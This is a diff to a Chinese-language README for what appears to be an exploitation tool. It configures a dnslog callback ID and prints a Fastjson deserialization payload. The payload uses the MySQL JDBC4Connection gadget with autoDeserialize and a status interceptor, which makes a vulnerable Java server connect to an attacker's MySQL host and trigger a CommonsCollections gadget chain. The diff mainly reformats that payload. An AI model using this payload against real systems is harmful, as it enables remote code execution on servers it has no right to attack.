@@ -22,7 +22,7 @@
 在config.json中配置dnslog域名，并给一个ID值，例如ID是q2z1p8
 
 ```json
-	"dnslog":{
+    "dnslog":{
         "q2z1p8":"q2z1p8.dnslog.cn"
     }
 ```
@@ -32,5 +32,22 @@
 效果：
 
 ```json
-{"x":{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"xx.xx.xx.xx","portToConnectTo":3306,"info":{"user":"d_cc4_p_q2z1p8","password":"ubuntu","useSSL":"false","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true"},"databaseToConnectTo":"mysql","url":""}}
+{
+    "x": {
+        "@type": "com.mysql.jdbc.JDBC4Connection",
+        "hostToConnectTo": "xx.xx.xx.xx",
+        "portToConnectTo": 3306,
+        "info": {
+            "user": "d_cc4_p_q2z1p8",
+            "password": "ubuntu",
+            "useSSL": "false",
+            "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
+            "autoDeserialize": "true"
+        },
+        "databaseToConnectTo": "mysql",
+        "url": ""
+    }
+}
 ```
+
+![image-20221222185551148](./README.assets/image-20221222185551148.png)
